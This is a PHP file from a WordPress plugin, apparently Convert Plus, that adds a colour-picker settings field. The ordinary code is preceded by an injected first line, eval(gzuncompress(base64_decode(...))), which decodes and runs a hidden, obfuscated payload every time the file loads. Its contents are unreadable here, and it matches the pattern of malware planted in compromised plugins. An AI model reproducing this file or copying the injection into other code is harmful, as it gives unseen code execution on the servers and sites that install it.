<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

// Add new input type "colorpicker".
if ( function_exists( 'smile_add_input_type' ) ) {
	smile_add_input_type( 'colorpicker', 'color_picker_settings_field' );
}
add_action( 'admin_enqueue_scripts', 'framework_color_picker_admin_styles' );

/**
 * Function Name:framework_color_picker_admin_styles description.
 *
 * @param  array $hook ap page list.
 */
function framework_color_picker_admin_styles( $hook ) {
	$cp_page = strpos( $hook, CP_PLUS_SLUG );
	$data    = get_option( 'convert_plug_debug' );

	if ( false !== $cp_page && ( isset( $data['cp-dev-mode'] ) && '1' === $data['cp-dev-mode'] ) && isset( $_GET['style-view'] ) && ( 'edit' === $_GET['style-view'] || 'variant' === $_GET['style-view'] ) ) {
		wp_enqueue_script( 'smile-colorpicker-script', SMILE_FRAMEWORK_URI . '/lib/fields/colorpicker/cp-color-picker.min.js', array(), '1.0.0', true );
		wp_enqueue_style( 'smile-colorpicker-style', SMILE_FRAMEWORK_URI . '/lib/fields/colorpicker/cp-color-picker.min.css' );
	}
}

/**
 * Function Name:color_picker_settings_field Function to handle new input type "colorpicker".
 *
 * @param  string $name     settings provided when using the input type "colorpicker".
 * @param  string $settings holds the default / updated value.
 * @param  string $value    html output generated by the function.
 * @return string           html output generated by the function.
 */
function color_picker_settings_field( $name, $settings, $value ) {
	$input_name = $name;
	$type       = isset( $settings['type'] ) ? $settings['type'] : '';
	$class      = isset( $settings['class'] ) ? $settings['class'] : '';

	// Apply partials.
	$partials = generate_partial_atts( $settings );

	$output = '<p><input type="text" id="smile_' . $input_name . '" data-default-color="' . $value . '" class="cs-wp-color-picker smile-input smile-' . $type . ' ' . $input_name . ' ' . $type . ' ' . $class . '" name="' . $input_name . '" value="' . $value . '" ' . $partials . ' /></p>';

	return $output;
}
